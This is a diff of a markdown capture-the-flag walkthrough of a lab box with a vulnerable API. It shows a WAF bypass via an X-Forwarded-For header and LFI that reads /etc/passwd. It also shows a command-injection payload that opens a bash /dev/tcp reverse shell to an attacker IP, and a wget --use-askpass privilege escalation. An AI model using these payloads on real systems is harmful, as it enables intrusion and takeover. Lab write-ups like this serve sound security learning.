@@ -21,13 +21,13 @@ This box likely has some API exploitation, so we can start proxying traffic thro
 
 Port 13337 shows some basic documentation for an API:
 
-<figure><img src="../../../.gitbook/assets/image (3625).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3625).png>)
 
 The most interesting was the `/update` endpoint, which accepted a user-controlled URL and says it updates the application via a 'Linux Executable'. This might be vulnerable to RCE if we can chain commands to the end of the URL.
 
 But we didn't have a username yet. There's also a `/logs` endpoint:
 
-<figure><img src="../../../.gitbook/assets/image (2572).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2572).png>)
 
 Attempting to visit it results in a WAF blocking us:
 
@@ -45,7 +45,6 @@ Error! No file specified. Use file=/path/to/log/file to access log files.
 
 This looks vulnerable to LFI, and it works!
 
-{% code overflow="wrap" %}
 ```
 $ curl http://192.168.183.134:13337/logs?file=/etc/passwd -H 'X-Forwarded-For: localhost
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -74,13 +73,12 @@ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
 ```
-{% endcode %}
 
 There's a `clumsyadmin` user present, and this might be the user we need. Then, we can use the `/update` endpoint to send requests to our HTTP server:
 
-<figure><img src="../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(203).png>)
 
-<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(91).png>)
 
 Since our parameters was being passed to a 'Linux Executable', I assumed that the URL parameter was not being properly sanitised (and is probably using `wget` or something).
 
@@ -90,7 +88,7 @@ To test, I sent this JSON data:
 {"user":"clumsyadmin","url":"http://192.168.45.184/hiiamssrf; wget 192.168.45.184/hiiamrce"}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(525).png>)
 
 This confirms we have RCE. We can get a reverse shell via this JSON object:
 
@@ -98,7 +96,7 @@ This confirms we have RCE. We can get a reverse shell via this JSON object:
 {"user":"clumsyadmin","url":"http://192.168.45.184/hiiamssrf; bash -c 'bash -i >& /dev/tcp/192.168.45.184/21 0>&1'"}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(714).png>)
 
 ## Privilege Escalation
 
@@ -122,4 +120,4 @@ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
 wget --use-askpass=$TF 0
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3423).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3423).png>)
